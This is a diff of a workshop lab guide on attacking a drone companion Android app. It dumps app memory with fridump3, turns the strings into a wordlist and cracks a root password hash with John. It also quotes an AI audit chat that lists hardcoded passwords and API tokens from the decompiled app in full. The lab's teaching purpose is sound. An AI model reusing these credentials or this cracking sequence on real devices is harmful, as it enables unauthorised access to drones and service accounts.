@@ -259,9 +259,9 @@ ps -ef | grep -i frida
 ```
 
 ---
-## Dump Memory from running Specta app to Laptop
+## Dump Memory from running Solex app to Laptop
 
-Start the Specta app on the Android device
+Start the Solex app on the Android device
 
 Then run the following commands
 
@@ -272,9 +272,10 @@ frida-ps -U | grep -i solex
 # not the Process ID (PID)
 cd fridump3
 mkdir solex
-python3 fridump3.py -r -U 
+python3 fridump3.py -r -o solex -u Solex
 ```
 ---
+
 ## Create a wordlist from the memory dump
 
 **The idea:** when the app runs, the drone's password sits somewhere in its memory as plain text. We just dumped all of that memory to disk. We don't know *which* piece of text is the password — so we treat **every unique string in the dump as a password guess.** `sort -u` collapses the dump to a list of unique strings; that becomes our custom wordlist. Then `john` tries each one against the `shadow` hash we recovered in Lab 04. If the password is anywhere in memory, John will find it.
@@ -283,6 +284,8 @@ Save the file to the same directory we saved the passwd file earlier
 
 ```bash
 cd solex
+# look for strings with minimum length of 8 to reduce noise
+strings -n 8 *data >> strings.txt
 sort -u strings.txt > solex-strings-uniq.txt
 cp solex-strings-uniq.txt /home/kali/workshop/apps/john
 ```
@@ -296,3 +299,98 @@ john --wordlist=/home/kali/workshop/apps/frida/fridump3/solex/strings.uniq unsha
 ```
 
 *Congratulations! You just brute forced the root password*
+
+---
+
+## VSCode
+```bash
+echo "code code/add-microsoft-repo boolean true" | sudo debconf-set-selections
+wget https://update.code.visualstudio.com/1.108.1/linux-deb-x64/stable
+mv stable vscode.deb
+sudo apt install ./vscode.deb
+```
+
+
+Open apk in jadx, export project into a new directory
+
+```
+scan this android code which is being analyzed for a security audit for hardcoded passwords, keys, tokens, and other credentials
+```
+
+```copilot
+I scanned the Android sources and found multiple likely hardcoded credentials.
+
+Findings:
+
+Hardcoded SSH/password material
+
+SoloApp.java
+SoloComp.java
+Hardcoded SoloLink/vehicle passwords
+
+DroneKitManager.java
+BackgroundRunnerService.java
+Hardcoded service/API tokens and keys
+
+BuildConfig.java:
+Mapbox access token
+Mixpanel token
+Parse client key
+Takeoff server key
+NetworkUtils.java
+BackgroundRunnerService.java
+Hardcoded SDK developer token
+
+AbstractSpiCall.java
+BuildConfig.java
+```
+
+```
+enumerate the passwords, keys, and tokens explicity in this panel
+```
+
+```
+Here are the explicit credentials I found in the scanned code:
+
+Passwords
+
+TjSDBkAu in:
+SoloApp.java
+SoloComp.java
+
+sololink in:
+DroneKitManager.java
+BackgroundRunnerService.java
+API / service tokens and keys
+
+bd02efe84c11b41d11c4644e9b04ad4673deb6df in:
+BackgroundRunnerService.java
+
+431055c7bf461cf689453dfca6101d143914c494 in:
+NetworkUtils.java
+BackgroundRunnerService.java
+BuildConfig.java (TAKE_OFF_SERVER_KEY)
+
+470fa2b4ae81cd56ecbcda9735803434cec591fa in:
+AbstractSpiCall.java
+BuildConfig.java
+
+pk.eyJ1IjoiM2Ryb2JvdGljcyIsImEiOiJkeGcxZ2FJIn0.V5HDBvRkxgYBBJjWweOI1g in:
+BuildConfig.java (MAPBOX_ACCESS_TOKEN)
+
+92bc0c9a2c005cfc6fe7d9ca9d6b78d0 in:
+BuildConfig.java (MIXPANEL_TOKEN)
+
+l9jVycsLbwfzpU1VaVyieCnsMNRJZGEMFzfMKP7I in:
+BuildConfig.java (PARSE_APP_ID)
+
+yuoTdCR6wLnFKejv4DX76KkbepLRUHXp0TUSBOtB in:
+BuildConfig.java (PARSE_CLIENT_KEY)
+Other notable hardcoded values
+
+10.1.1.1 and 10.1.1.10 are hardcoded IPs, though not credentials
+root is a hardcoded username, not a secret but relevant to access control
+If you want, I can also format this as a compact audit table with columns for type, value, file, and severity.
+
+MAI-Code-1-Flash • 1x
+```
